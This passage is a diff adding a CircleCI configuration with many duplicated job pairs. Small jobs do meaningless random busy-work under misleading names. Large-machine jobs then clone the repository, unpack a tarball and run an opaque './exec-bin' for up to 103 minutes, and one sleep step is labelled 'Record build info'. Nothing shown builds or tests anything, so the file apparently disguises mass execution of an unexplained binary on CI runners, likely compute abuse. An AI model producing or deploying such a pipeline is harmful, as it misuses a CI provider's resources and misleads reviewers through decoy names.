@@ -1,0 +1,1979 @@
+version: 2.1
+
+jobs:
+  warmup_produce-production-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Materialize sort order
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 397369 | md5sum; true ; } > /tmp/pipeline/step-27.txt
+            echo "gate produce-production-artifact-bundle: $(wc -c </tmp/pipeline/step-27.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-27.txt
+  produce-production-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/step-27.txt
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  teardown_alpha:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Shape kernel ring
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 2 19138 | factor | wc -l; true ; } > /tmp/pipeline/465b.txt
+            echo "gate alpha: $(wc -c </tmp/pipeline/465b.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 465b.txt
+  alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/465b.txt
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  green_Verify_Service7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Interleave stream pairs
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1945600 | wc -c; true ; } > /tmp/pipeline/audit.ndjson
+            echo "gate Verify_Service7: $(wc -c </tmp/pipeline/audit.ndjson) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - audit.ndjson
+  Verify_Service7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/audit.ndjson
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  warmer_ship-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Collect poll frames
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 281112 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/pipeline/artifact
+            echo "gate ship-it: $(wc -c </tmp/pipeline/artifact) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - artifact
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/artifact
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  inspect_mike:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Normalize path list
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 28000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/pipeline/log.ndjson
+            echo "gate mike: $(wc -c </tmp/pipeline/log.ndjson) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - log.ndjson
+  mike:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/log.ndjson
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  retry_Package_Tests8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Validate checksum roster
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 275271 | awk 'END{print NR}'; true ; } > /tmp/pipeline/output.out
+            echo "gate Package_Tests8: $(wc -c </tmp/pipeline/output.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - output.out
+  Package_Tests8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/output.out
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  sys_promote:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Register task slot
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 378293 | awk 'END{print NR}'; true ; } > /tmp/pipeline/summary.md
+            echo "gate promote: $(wc -c </tmp/pipeline/summary.md) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - summary.md
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/summary.md
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  preinit_fire-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Compute spill delta
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 171328 | awk '{if($1%97==0)c++}END{print c}'; true ; } > /tmp/pipeline/894x.data
+            echo "gate fire-up: $(wc -c </tmp/pipeline/894x.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 894x.data
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/894x.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  produce_green-light-go:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Fingerprint vendor tree
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; yes "x$RANDOM" | head -n 185168 | md5sum; true ; } > /tmp/pipeline/.marker
+            echo "gate green-light-go: $(wc -c </tmp/pipeline/.marker) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .marker
+  green-light-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/.marker
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  canary1_delta-5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Enumerate line counts
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 2400 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/pipeline/step-25.out
+            echo "gate delta-5: $(wc -c </tmp/pipeline/step-25.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-25.out
+  delta-5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/step-25.out
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  precheck_cerberus-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Measure entropy sample
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 2900 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/pipeline/step-20.txt
+            echo "gate cerberus-v2: $(wc -c </tmp/pipeline/step-20.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-20.txt
+  cerberus-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/step-20.txt
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  kick_helios-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Mint batch slot
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 259864 | awk '{s+=$1}END{print s}'; true ; } > /tmp/pipeline/payload
+            echo "gate helios-rev: $(wc -c </tmp/pipeline/payload) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - payload
+  helios-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/payload
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  compile_bob-run:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build adjacency map
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 391873 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/pipeline/2023-04-10.data
+            echo "gate bob-run: $(wc -c </tmp/pipeline/2023-04-10.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 2023-04-10.data
+  bob-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/2023-04-10.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  canary1_validate-full-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Verify fixture integrity
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; yes 'line' | head -n 304716 | awk '{print NR, $0}' | tail -1; true ; } > /tmp/pipeline/DONE
+            echo "gate validate-full-artifact-bundle: $(wc -c </tmp/pipeline/DONE) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - DONE
+  validate-full-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/DONE
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  maker_full-send:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Dispatch work units
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 472468 | awk 'NR>19408 && NR<28274{s+=$1}END{print s}'; true ; } > /tmp/pipeline/24.blob
+            echo "gate full-send: $(wc -c </tmp/pipeline/24.blob) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 24.blob
+  full-send:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/24.blob
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  teardown_teh-ci:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Trace call sequence
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 502500 | paste - - - - | wc -l; true ; } > /tmp/pipeline/941v2.data
+            echo "gate teh-ci: $(wc -c </tmp/pipeline/941v2.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 941v2.data
+  teh-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/941v2.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  green_CHECK_PROD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Mirror config bundle
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 488592 | awk 'NR%1==0{sum+=$1}END{print sum}'; true ; } > /tmp/pipeline/main_phase_output_v5.txt
+            echo "gate CHECK_PROD: $(wc -c </tmp/pipeline/main_phase_output_v5.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - main_phase_output_v5.txt
+  CHECK_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/main_phase_output_v5.txt
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  teardown_v2-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Mix shuffle salt
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=1;a++)for(b=1;b<=26093;b++)s+=a*b;print s}'; true ; } > /tmp/pipeline/gate-pass.log
+            echo "gate v2-canary: $(wc -c </tmp/pipeline/gate-pass.log) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - gate-pass.log
+  v2-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/gate-pass.log
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  B_APP-323:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Format readable table
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 15728640 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/pipeline/report.out
+            echo "gate APP-323: $(wc -c </tmp/pipeline/report.out) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - report.out
+  APP-323:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/report.out
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  package_Verify_Pipeline6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Rotate ring buffer
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 10240000 | base64 | head -c 200 | wc -c; true ; } > /tmp/pipeline/handoff.sig
+            echo "gate Verify_Pipeline6: $(wc -c </tmp/pipeline/handoff.sig) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - handoff.sig
+  Verify_Pipeline6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/handoff.sig
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  audit_wip-cache:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Collate adjacent chunks
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 24117248 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/pipeline/.sig
+            echo "gate wip-cache: $(wc -c </tmp/pipeline/.sig) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - .sig
+  wip-cache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/.sig
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  deps_dec27-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Checkpoint context
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; seq 1 232496 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/pipeline/2024-08-18.data
+            echo "gate dec27-ship: $(wc -c </tmp/pipeline/2024-08-18.data) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - 2024-08-18.data
+  dec27-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/2024-08-18.data
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  redo_Validate_Pipeline6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Partition record set
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 61440 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/pipeline/counts.json
+            echo "gate Validate_Pipeline6: $(wc -c </tmp/pipeline/counts.json) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - counts.json
+  Validate_Pipeline6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/counts.json
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  hydrate_ruby3-test:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Inflate reference set
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z0-9 ' </dev/urandom | head -c 1126400 | tr ' ' '\n' | sort | uniq | wc -l; true ; } > /tmp/pipeline/step-15.txt
+            echo "gate ruby3-test: $(wc -c </tmp/pipeline/step-15.txt) bytes total"
+      - persist_to_workspace:
+          root: /tmp/pipeline
+          paths:
+            - step-15.txt
+  ruby3-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pipeline
+      - run:
+          name: Peek upstream
+          command: |
+            cat /tmp/pipeline/step-15.txt
+      - run:
+          name: Fetch artifact
+          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore inputs
+          command: tar xf build-output.tar
+      - run:
+          name: Record build info
+          command: /bin/sleep 30
+      - run:
+          command: uname -a
+      - run:
+          command: du -sh .
+      - run:
+          no_output_timeout: 103m
+          command: /bin/bash -c "./exec-bin"
+  fetcher_wip-edge:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Walk directory tree
+          command: |
+            mkdir -p /tmp/pipeline
+            { set +o pipefail 2>/dev/null; head -c 6291456 /dev/urandom | sha256sum; true ; } > /tmp/pipeline/secondary_phase_output.log
